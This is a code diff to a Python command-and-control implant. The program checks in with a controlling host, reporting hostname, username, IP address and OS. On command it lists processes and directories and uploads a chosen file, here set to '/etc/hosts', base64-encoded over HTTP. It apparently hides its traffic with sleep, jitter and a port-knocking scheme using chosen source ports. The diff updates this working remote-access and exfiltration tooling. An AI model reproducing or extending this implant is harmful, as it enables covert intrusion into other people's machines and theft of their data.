@@ -22,6 +22,7 @@ import base64
 import json
 import lzma
 import os
+import getpass
 import psutil
 import pycurl
 import random
@@ -31,7 +32,7 @@ import stat
 import sys
 import time
 import uuid
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 from io import BytesIO
 from tqdm import tqdm
 
@@ -49,7 +50,7 @@ sleep = 15
 jitter = 3
 
 # file to exfiltrate
-exfil_filename = None
+exfil_filename = '/etc/hosts'
 
 """
 Port range for data transfer: The capacity (x60) primarily serves to accommodate situations where a port is
@@ -95,7 +96,7 @@ def send_pkt(host:str, dport:int, sports:list):
             printmsg(f"Warning! {p} is beyond data port range (> {end_port})")
 
         # Sleep for at least 60 secs for the TCP connection to completely close
-        while datetime.utcnow() - portinf[p] <= timedelta(seconds=65):
+        while datetime.now(timezone.utc) - portinf[p] <= timedelta(seconds=65):
             if start_port <= p <= end_port:
                 p += 256
 
@@ -104,7 +105,7 @@ def send_pkt(host:str, dport:int, sports:list):
                     printmsg(f'Sleep for 10 secs...  {p=}')
                     time.sleep(10)
             else:
-                for _, knock_seqs in knocks.items():
+                for knock_seqs in knocks.values():
                     seq_index = within_knock_sequences(knock_seqs, p, tolerance=proximity_tolerance)
 
                     if seq_index >=0 and 0 <= (p - knock_seqs[seq_index]) < proximity_tolerance:
@@ -115,7 +116,7 @@ def send_pkt(host:str, dport:int, sports:list):
                             printmsg(f'Sleep for 10 secs ...  {p=}')
                             time.sleep(10)
 
-        portinf[p] = datetime.utcnow()
+        portinf[p] = datetime.now(timezone.utc)
 
         c = pycurl.Curl()
         c.setopt(pycurl.URL, f'http://{host}:{dport}/chk-version')
@@ -211,12 +212,12 @@ def parse_args():
             print('\nEphemeral port test FAILED.')
         exit(0)
 
-    return
+    return args
 
 
 def printmsg(msg):
     """Print messages with current timestamps prepended"""
-    print(f'{datetime.utcnow().strftime("[%Y-%m-%d %H:%M:%S]")} {msg}')
+    print(f'{datetime.now(timezone.utc).strftime("[%Y-%m-%d %H:%M:%S]")} {msg}')
 
 
 def upload_file(task_id:int):
@@ -230,8 +231,8 @@ def upload_file(task_id:int):
         'id': task_id,
         'cmd': 'upload',
         'uuid': hostuuid,
-        'hostname': hostname,
-        'filename': exfil_filename,
+        'host': hostname,
+        'file': exfil_filename,
         'payload': base64.b64encode(filedata).decode('utf-8')
     }
 
@@ -251,11 +252,11 @@ def checkin():
     data = {
         'cmd': 'chkin',
         'payload': {
-            'Hostname': hostname,
-            'Username': os.getlogin(),
-            'IP': ip,
-            'OS': get_os(),
-            'UUID': hostuuid,
+            'host': hostname,
+            'user': getpass.getuser(),
+            'ip': ip,
+            'os': get_os(),
+            'uuid': hostuuid,
         }
     }
 
@@ -297,7 +298,7 @@ def list_process(task_id:int):
     data = {
         'id': task_id,
         'cmd': 'ps',
-        'hostname': hostname,
+        'host': hostname,
         'payload': output,
     }
 
@@ -313,7 +314,7 @@ def list_dir(task_id:int, dir='.'):
         statinf = os.stat(filepath)
         mode = statinf.st_mode
         size = statinf.st_size
-        last_modified = datetime.utcfromtimestamp(statinf.st_mtime).strftime('%Y-%m-%d %H:%M')
+        last_modified = datetime.fromtimestamp(statinf.st_mtime).replace(tzinfo=timezone.utc).strftime('%Y-%m-%d %H:%M')
         is_directory = stat.S_ISDIR(mode)
         permissions = stat.filemode(mode)
 
@@ -325,7 +326,7 @@ def list_dir(task_id:int, dir='.'):
     data = {
         'id': task_id,
         'cmd': 'ls',
-        'hostname': hostname,
+        'host': hostname,
         'payload': output,
     }
 
@@ -370,7 +371,7 @@ def check_ephemeral_port() -> bool:
             client_socket.connect((dhost, int(dport)))
 
             # Use the current timestamp as the challenge
-            challenge = f'duel_{datetime.utcnow().timestamp()}'
+            challenge = f'duel_{datetime.now(timezone.utc).timestamp()}'
 
             client_socket.send(f'{challenge}'.encode('utf-8'))
             data = client_socket.recv(1024).decode('utf-8')
@@ -404,13 +405,13 @@ def main():
     global c2_command_idx
 
     for i in range(1024, 65536):
-        portinf[i] = datetime.strptime('2023-01-01', '%Y-%m-%d')
+        portinf[i] = datetime.strptime('2023-01-01', '%Y-%m-%d').replace(tzinfo=timezone.utc)
 
-    parse_args()
+    args = parse_args()
 
-    if exfil_filename:
+    if args.upload:
         printmsg(f'Exfiltrating file {exfil_filename} ...')
-        upload_file(int(datetime.utcnow().timestamp()))
+        upload_file(int(datetime.now(timezone.utc).timestamp()))
         exit(0)
 
     while True:
